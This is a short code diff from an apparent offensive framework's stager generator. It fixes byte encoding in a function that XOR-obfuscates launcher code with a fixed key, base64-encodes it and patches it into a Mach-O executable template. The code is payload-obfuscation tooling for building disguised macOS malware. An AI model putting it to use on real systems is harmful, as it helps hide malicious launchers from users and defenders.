@@ -207,8 +207,8 @@ class Stagers(object):
 
             key = 'subF'
             launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(launcherCode, cycle(key)))
-            launcherCode = base64.urlsafe_b64encode(launcherCode)
-            launcher = launcherCode.encode('utf-8') + b'\x00' * (placeHolderSz - len(launcherCode))
+            launcherCode = base64.urlsafe_b64encode(launcherCode.encode('utf-8'))
+            launcher = launcherCode + b'\x00' * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
 
             return patchedMachO
